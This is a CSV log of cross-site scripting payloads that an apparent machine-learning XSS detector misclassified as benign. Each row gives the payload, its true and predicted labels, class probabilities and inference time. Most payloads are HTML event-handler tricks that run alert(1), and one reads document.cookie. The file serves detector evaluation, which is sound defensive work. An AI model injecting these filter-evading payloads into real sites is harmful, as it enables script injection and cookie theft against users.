payload,true_label,predicted_label,probabilities,inference_time_ms
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",1,0,"{'benign': 0.6046, 'malicious': 0.3954}",62.24249999999998
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",1,0,"{'benign': 0.592, 'malicious': 0.408}",43.67870000000096
"<option onkeydown=""alert(1)"" contenteditable>test</option>",1,0,"{'benign': 0.5922, 'malicious': 0.4078}",47.89309999999958
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,1,0,"{'benign': 0.6021, 'malicious': 0.3979}",54.23620000000007
<hr id=x tabindex=1 onactivate=alert(1)></hr>,1,0,"{'benign': 0.5963, 'malicious': 0.4037}",50.06670000000035
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",1,0,"{'benign': 0.6012, 'malicious': 0.3988}",73.8165999999989
<em onpointerout=alert(1)>XSS</em>,1,0,"{'benign': 0.5995, 'malicious': 0.4005}",56.34060000000041
"<cite onmouseout=""alert(1)"">test</cite>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",48.62310000000036
"<details onmousemove=""alert(1)"">test</details>",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",46.90669999999919
<table onpointerleave=alert(1)>XSS</table>,1,0,"{'benign': 0.6004, 'malicious': 0.3996}",47.55779999999987
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",1,0,"{'benign': 0.6034, 'malicious': 0.3966}",54.95160000000077
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1,0,"{'benign': 0.5995, 'malicious': 0.4005}",69.09509999999841
"<bdo onclick=""alert(1)"">test</bdo>",1,0,"{'benign': 0.5876, 'malicious': 0.4124}",41.29580000000033
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",1,0,"{'benign': 0.599, 'malicious': 0.401}",101.44929999999874
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,1,0,"{'benign': 0.6031, 'malicious': 0.3969}",71.74479999999939
"<image onmouseover=""alert(1)"">test</image>",1,0,"{'benign': 0.5882, 'malicious': 0.4118}",76.52530000000013
<noembed id=x tabindex=1 onfocus=alert(1)></noembed>,1,0,"{'benign': 0.5954, 'malicious': 0.4046}",118.30810000000014
<sub onpointerleave=alert(1)>XSS</sub>,1,0,"{'benign': 0.5966, 'malicious': 0.4034}",40.29330000000009
"<area onkeyup=""alert(1)"" contenteditable>test</area>",1,0,"{'benign': 0.5944, 'malicious': 0.4056}",44.47970000000012
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1,0,"{'benign': 0.6001, 'malicious': 0.3999}",48.977799999999405
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",1,0,"{'benign': 0.6059, 'malicious': 0.3941}",100.17809999999905
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1,0,"{'benign': 0.5928, 'malicious': 0.4072}",64.03539999999985
<section onpointerover=alert(1)>XSS</section>,1,0,"{'benign': 0.6006, 'malicious': 0.3994}",57.55000000000088
<object onpointerover=alert(1)>XSS</object>,1,0,"{'benign': 0.6016, 'malicious': 0.3984}",47.04019999999964
"<optgroup onbeforecut=""alert(1)"" contenteditable>test</optgroup>",1,0,"{'benign': 0.5951, 'malicious': 0.4049}",50.40829999999907
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1,0,"{'benign': 0.6003, 'malicious': 0.3997}",62.34120000000054
"<textarea onmouseover=""alert(1)"">test</textarea>",1,0,"{'benign': 0.5873, 'malicious': 0.4127}",49.7235000000007
"<tr onkeypress=""alert(1)"" contenteditable>test</tr>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",76.57079999999894
"<header onmouseover=""alert(1)"">test</header>",1,0,"{'benign': 0.5904, 'malicious': 0.4096}",60.539999999999594
"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",1,0,"{'benign': 0.6036, 'malicious': 0.3964}",124.45350000000133
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",1,0,"{'benign': 0.6021, 'malicious': 0.3979}",45.46290000000042
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1,0,"{'benign': 0.5999, 'malicious': 0.4001}",60.56380000000061
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.5928, 'malicious': 0.4072}",52.13559999999973
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",1,0,"{'benign': 0.6032, 'malicious': 0.3968}",44.83319999999935
"<address onclick=""alert(1)"">test</address>",1,0,"{'benign': 0.5854, 'malicious': 0.4146}",48.12130000000181
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1,0,"{'benign': 0.5904, 'malicious': 0.4096}",53.94060000000067
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1,0,"{'benign': 0.6012, 'malicious': 0.3988}",67.01449999999909
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",1,0,"{'benign': 0.6105, 'malicious': 0.3895}",79.07640000000171
"<listing onclick=""alert(1)"">test</listing>",1,0,"{'benign': 0.5868, 'malicious': 0.4132}",58.56239999999957
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1,0,"{'benign': 0.5932, 'malicious': 0.4068}",41.67670000000001
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",44.068700000000405
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",41.882299999997485
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,0,"{'benign': 0.6072, 'malicious': 0.3928}",102.59049999999803
<dir onpointerup=alert(1)>XSS</dir>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",48.65930000000063
"<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>",1,0,"{'benign': 0.5923, 'malicious': 0.4077}",86.55630000000158
"<multicol onmouseover=""alert(1)"">test</multicol>",1,0,"{'benign': 0.588, 'malicious': 0.412}",44.85349999999855
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",47.51910000000237
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",53.57689999999948
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1,0,"{'benign': 0.5945, 'malicious': 0.4055}",50.531200000001775
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",1,0,"{'benign': 0.6012, 'malicious': 0.3988}",60.90469999999826
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1,0,"{'benign': 0.6015, 'malicious': 0.3985}",48.08790000000229
<dt onpointerenter=alert(1)>XSS</dt>,1,0,"{'benign': 0.6014, 'malicious': 0.3986}",40.844199999998665
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",1,0,"{'benign': 0.6003, 'malicious': 0.3997}",61.884800000001405
<body onblur=alert(1) id=x><iframe id=x>,1,0,"{'benign': 0.5944, 'malicious': 0.4056}",35.71099999999916
"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>",1,0,"{'benign': 0.5945, 'malicious': 0.4055}",49.11309999999958
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1,0,"{'benign': 0.599, 'malicious': 0.401}",54.48510000000084
top[??al\x65rt??¢](1),1,0,"{'benign': 0.5882, 'malicious': 0.4118}",42.78129999999791
"<br onmouseenter=""alert(1)"">test</br>",1,0,"{'benign': 0.5873, 'malicious': 0.4127}",41.04909999999862
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",1,0,"{'benign': 0.6009, 'malicious': 0.3991}",59.41699999999983
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1,0,"{'benign': 0.5994, 'malicious': 0.4006}",47.35549999999833
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1,0,"{'benign': 0.5951, 'malicious': 0.4049}",32.13039999999978
<marquee onstart=alert(1)></marquee>,1,0,"{'benign': 0.5881, 'malicious': 0.4119}",36.438799999999105
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1,0,"{'benign': 0.5958, 'malicious': 0.4042}",42.82979999999981
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1,0,"{'benign': 0.6048, 'malicious': 0.3952}",49.45980000000105
<tr onpointerenter=alert(1)>XSS</tr>,1,0,"{'benign': 0.602, 'malicious': 0.398}",40.84930000000142
"<s onkeyup=""alert(1)"" contenteditable>test</s>",1,0,"{'benign': 0.5845, 'malicious': 0.4155}",45.40940000000049
<dd id=x tabindex=1 onactivate=alert(1)></dd>,1,0,"{'benign': 0.5934, 'malicious': 0.4066}",36.00070000000244
"<acronym onmouseup=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5894, 'malicious': 0.4106}",40.020800000000634
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1,0,"{'benign': 0.5993, 'malicious': 0.4007}",54.271200000002295
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1,0,"{'benign': 0.5952, 'malicious': 0.4048}",43.79169999999988
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",1,0,"{'benign': 0.6018, 'malicious': 0.3982}",55.244500000000585
<cite onpointerleave=alert(1)>XSS</cite>,1,0,"{'benign': 0.5979, 'malicious': 0.4021}",35.731800000000646
"<style oncut=""alert(1)"" contenteditable>test</style>",1,0,"{'benign': 0.5917, 'malicious': 0.4083}",44.12579999999977
<textarea autofocus onfocusin=alert(1)>test</textarea>,1,0,"{'benign': 0.593, 'malicious': 0.407}",42.92300000000182
<frame onpointerenter=alert(1)>XSS</frame>,1,0,"{'benign': 0.6028, 'malicious': 0.3972}",45.42449999999931
<custom tags onpointerout=alert(1)>XSS</custom tags>,1,0,"{'benign': 0.6019, 'malicious': 0.3981}",34.02589999999961
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1,0,"{'benign': 0.6025, 'malicious': 0.3975}",55.92509999999962
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1,0,"{'benign': 0.5977, 'malicious': 0.4023}",48.68370000000155
"<nobr ondblclick=""alert(1)"">test</nobr>",1,0,"{'benign': 0.5852, 'malicious': 0.4148}",42.582699999996976
"<BR SIZE=""&{alert('')}"">",1,0,"{'benign': 0.5952, 'malicious': 0.4048}",37.720499999998935
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,0,"{'benign': 0.597, 'malicious': 0.403}",42.53049999999803
<menu onpointerdown=alert(1)>XSS</menu>,1,0,"{'benign': 0.5986, 'malicious': 0.4014}",44.28150000000031
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.596, 'malicious': 0.404}",44.739900000003274
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",1,0,"{'benign': 0.5973, 'malicious': 0.4027}",50.954300000000785
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",1,0,"{'benign': 0.6029, 'malicious': 0.3971}",56.85269999999676
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,1,0,"{'benign': 0.5947, 'malicious': 0.4053}",41.094799999999765
"<title ondblclick=""alert(1)"">test</title>",1,0,"{'benign': 0.5863, 'malicious': 0.4137}",41.84870000000274
"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1,0,"{'benign': 0.5893, 'malicious': 0.4107}",42.36789999999857
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",40.956900000001184
"<center onmouseleave=""alert(1)"">test</center>",1,0,"{'benign': 0.5879, 'malicious': 0.4121}",39.60230000000209
<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>,1,0,"{'benign': 0.5983, 'malicious': 0.4017}",51.47890000000288
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1,0,"{'benign': 0.5982, 'malicious': 0.4018}",45.95799999999883
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1,0,"{'benign': 0.6036, 'malicious': 0.3965}",51.6615999999992
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",43.587599999998616
"RC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""",1,0,"{'benign': 0.6279, 'malicious': 0.3721}",290.83969999999937
<hr onpointerenter=alert(1)>XSS</hr>,1,0,"{'benign': 0.6024, 'malicious': 0.3976}",55.61080000000018
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",1,0,"{'benign': 0.6011, 'malicious': 0.3989}",54.098100000000926
"<object ondblclick=""alert(1)"">test</object>",1,0,"{'benign': 0.5857, 'malicious': 0.4143}",39.1736999999992
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(1)""></applet>",1,0,"{'benign': 0.6013, 'malicious': 0.3987}",50.209099999996454
"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>",1,0,"{'benign': 0.591, 'malicious': 0.409}",42.616899999998736
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",1,0,"{'benign': 0.5959, 'malicious': 0.4041}",40.27359999999902
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1,0,"{'benign': 0.5917, 'malicious': 0.4083}",42.864100000002736
"<colgroup onmouseout=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.5878, 'malicious': 0.4122}",40.46689999999842
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",1,0,"{'benign': 0.6038, 'malicious': 0.3962}",62.05539999999843
<image3 onpointerdown=alert(1)>XSS</image3>,1,0,"{'benign': 0.596, 'malicious': 0.404}",42.93750000000074
"<listing draggable=""true"" ondragenter=""alert(1)"">test</listing>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",51.52580000000029
"<cite onmouseover=""alert(1)"">test</cite>",1,0,"{'benign': 0.5878, 'malicious': 0.4122}",36.33040000000065
"<dd oncontextmenu=""alert(1)"">test</dd>",1,0,"{'benign': 0.5966, 'malicious': 0.4034}",43.12619999999967
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",1,0,"{'benign': 0.6, 'malicious': 0.4}",82.32650000000064
"<svg onmouseup=""alert(1)"">test</svg>",1,0,"{'benign': 0.5883, 'malicious': 0.4117}",43.161500000000075
<svg><dt onload=alert(1)></dt>,1,0,"{'benign': 0.5922, 'malicious': 0.4078}",37.33920000000168
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,1,0,"{'benign': 0.6034, 'malicious': 0.3966}",53.3500999999994
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1,0,"{'benign': 0.6083, 'malicious': 0.3917}",59.88609999999994
"<thead onmouseenter=""alert(1)"">test</thead>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",32.04199999999702
<br onpointerover=alert(1)>XSS</br>,1,0,"{'benign': 0.6029, 'malicious': 0.3971}",34.749800000000164
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",57.21630000000033
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,1,0,"{'benign': 0.6042, 'malicious': 0.3958}",44.89320000000063
<svg><image href=1 onerror=alert(1)>,1,0,"{'benign': 0.5953, 'malicious': 0.4047}",38.179700000000594
<svg><template onload=alert(1)></template>,1,0,"{'benign': 0.5924, 'malicious': 0.4076}",33.439099999998945
document.write,1,0,"{'benign': 0.5675, 'malicious': 0.4325}",34.675299999999964
"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",1,0,"{'benign': 0.5963, 'malicious': 0.4037}",42.8816999999988
<picture onpointerdown=alert(1)>XSS</picture>,1,0,"{'benign': 0.5954, 'malicious': 0.4046}",43.06839999999923
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,1,0,"{'benign': 0.5927, 'malicious': 0.4073}",48.688699999999585
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",1,0,"{'benign': 0.5911, 'malicious': 0.4089}",42.74640000000218
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",1,0,"{'benign': 0.5894, 'malicious': 0.4106}",43.56870000000157
<listing onpointermove=alert(1)>XSS</listing>,1,0,"{'benign': 0.6025, 'malicious': 0.3975}",41.52149999999821
<b onpointerenter=alert(1)>XSS</b>,1,0,"{'benign': 0.6044, 'malicious': 0.3956}",40.29260000000079
"<label onmousemove=""alert(1)"">test</label>",1,0,"{'benign': 0.5887, 'malicious': 0.4113}",38.66209999999981
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",92.60940000000062
<svg onpointerdown=alert(1)>XSS</svg>,1,0,"{'benign': 0.5964, 'malicious': 0.4036}",44.81580000000207
<img src/onerror=alert(1)>,1,0,"{'benign': 0.5865, 'malicious': 0.4135}",40.0180999999975
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",1,0,"{'benign': 0.6089, 'malicious': 0.3911}",60.03869999999978
<input type=checkbox id=x onfocus=alert(1)>,1,0,"{'benign': 0.5905, 'malicious': 0.4095}",36.6950000000017
"<h1 onmousedown=""alert(1)"">test</h1>",1,0,"{'benign': 0.5916, 'malicious': 0.4084}",43.364800000002646
<dir onpointerout=alert(1)>XSS</dir>,1,0,"{'benign': 0.6045, 'malicious': 0.3955}",46.251399999999165
"<hgroup onmousemove=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",39.21539999999979
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1,0,"{'benign': 0.5997, 'malicious': 0.4003}",45.98230000000214
<code id=x tabindex=1 onactivate=alert(1)></code>,1,0,"{'benign': 0.5964, 'malicious': 0.4036}",40.3841000000007
<big onpointerup=alert(1)>XSS</big>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",39.056599999998554
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>",1,0,"{'benign': 0.5975, 'malicious': 0.4025}",52.33129999999875
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",39.60079999999877
"<button oncopy=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5941, 'malicious': 0.4059}",31.239400000000472
"<template draggable=""true"" ondrag=""alert(1)"">test</template>",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",42.19580000000178
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>,1,0,"{'benign': 0.5947, 'malicious': 0.4053}",41.225799999999424
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",1,0,"{'benign': 0.6004, 'malicious': 0.3996}",60.26029999999949
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("""")>",1,0,"{'benign': 0.6014, 'malicious': 0.3986}",54.0181000000004
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",1,0,"{'benign': 0.5978, 'malicious': 0.4022}",36.09379999999973
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",49.281000000000574
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",57.64289999999761
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1,0,"{'benign': 0.5957, 'malicious': 0.4043}",41.4867000000001
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,1,0,"{'benign': 0.5953, 'malicious': 0.4047}",48.99149999999963
"<i oncopy=""alert(1)"" contenteditable>test</i>",1,0,"{'benign': 0.6017, 'malicious': 0.3983}",44.894699999996845
<xmp onpointermove=alert(1)>XSS</xmp>,1,0,"{'benign': 0.5982, 'malicious': 0.4018}",42.08769999999973
<ins id=x tabindex=1 onactivate=alert(1)></ins>,1,0,"{'benign': 0.5956, 'malicious': 0.4044}",42.41139999999888
"<br onpaste=""alert(1)"" contenteditable>test</br>",1,0,"{'benign': 0.5941, 'malicious': 0.4059}",37.8306000000066
<discard onpointerup=alert(1)>XSS</discard>,1,0,"{'benign': 0.599, 'malicious': 0.401}",52.64669999999683
<svg><video onload=alert(1)></video>,1,0,"{'benign': 0.5945, 'malicious': 0.4055}",40.66710000000029
"<option onmousedown=""alert(1)"">test</option>",1,0,"{'benign': 0.5889, 'malicious': 0.4111}",38.13029999999884
<dd onpointerdown=alert(1)>XSS</dd>,1,0,"{'benign': 0.5972, 'malicious': 0.4028}",42.37960000000385
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",41.30789999999962
"<noframes onbeforecut=""alert(1)"" contenteditable>test</noframes>",1,0,"{'benign': 0.5996, 'malicious': 0.4004}",47.70570000000163
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5938, 'malicious': 0.4062}",43.069899999998995
"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",42.728999999994244
document.write(sadfsa),1,0,"{'benign': 0.5681, 'malicious': 0.4319}",36.056500000000824
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",1,0,"{'benign': 0.6054, 'malicious': 0.3946}",75.45700000000011
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1,0,"{'benign': 0.5963, 'malicious': 0.4037}",45.24390000000267
